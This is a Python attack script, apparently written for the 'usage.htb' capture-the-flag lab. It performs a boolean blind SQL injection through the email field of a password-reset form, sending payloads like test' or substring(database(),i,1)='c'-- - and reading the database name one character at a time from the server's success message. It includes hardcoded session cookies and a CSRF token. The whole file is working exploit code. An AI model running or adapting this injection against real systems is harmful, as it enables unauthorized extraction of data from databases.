#!/usr/bin/python3

import requests
import signal
import time
import pdb
import sys
import string
from pwn import *
from termcolor import colored

def def_handler(sig, frame):
	print(colored(f"\n\n[!] Saliendoo.. \n", 'red'))
	sys.exit(1)

#CTRL+C
signal.signal(signal.SIGINT, def_handler)

cookies = {
	'XSRF-TOKEN': 'eyJpdiI6Ik1qUG1ZYzJyUHRkWTZicFQwNzdZcXc9PSIsInZhbHVlIjoibTdRbkkrWXMra0Fhdkd0TWxrU01DVWlOVkVUTWdnUHAxKy82VStOUFBod3FGR0FIR1JweXlqREIzaHI1a25RS1dRd1AzYklDZTEwaFRnWXVUNTRHOGZWWVBMR2orY2dZcFgxWGtQWllGY3M4clJKM0xzamovTEc3R0dsZjJkUXQiLCJtYWMiOiIxY2U3NTQyODAyNjkxYTYyZWFkYTZkNTY4ZTNkZmMxYTA3YWRiZjgxNzFiNjc4NzU0MTY3ODJmZTZmNmJjMjYwIiwidGFnIjoiIn0=', 
	'laravel_session':'eyJpdiI6IjBJUVgxVWY2cnF4TWZoUmNkRytTZFE9PSIsInZhbHVlIjoiVU9kbkg5dnhBaUtmVFdKSC9HZVp6clU0SllOZFhRM3NiMitlWEg1aUxEelJ2Smd0WEsxZEphNk9KcW82TjMyMllldXhUWC9Rd3krcDBXc1YvZnl2T25YWjlScFVBeUdZSEJGUkcrdnE1RVhQb3NMM1JxOGt4QzVJSms0MStnZzEiLCJtYWMiOiJmODkyZjMzNTBmNWE4NzdiNTA4NjcyYmU5OWIxY2JkYTU3ZjAyZjAwNjc4MTcxM2E2NmFmN2NhMWIyYjgwMGQyIiwidGFnIjoiIn0='
}

characters = string.ascii_lowercase + '-_'
main_url = "http://usage.htb/forget-password"

def makeSQLI():

	p1 = log.progress("Fuerza bruta")
	p1.status("Iniciando proceso de fuerza bruta")

	time.sleep(2)
	database = ""
	p2 = log.progress("Database")
	for i in range (1, 100):
		for character in characters:
			post_data = {
			'_token':'TAnZ4ScgMpPwYoiq17IDPCFnkO4o5D2tDezJUqkW',
			'email': f"test' or substring(database(),{i},1)='{character}'-- -"
			}
			p1.status(post_data['email'])
			r = requests.post(main_url, data=post_data, cookies=cookies)

			if "We have e-mailed your password" in r.text:
				database += character
				p2.status(database)
				break
if __name__ == '__main__':
	makeSQLI()
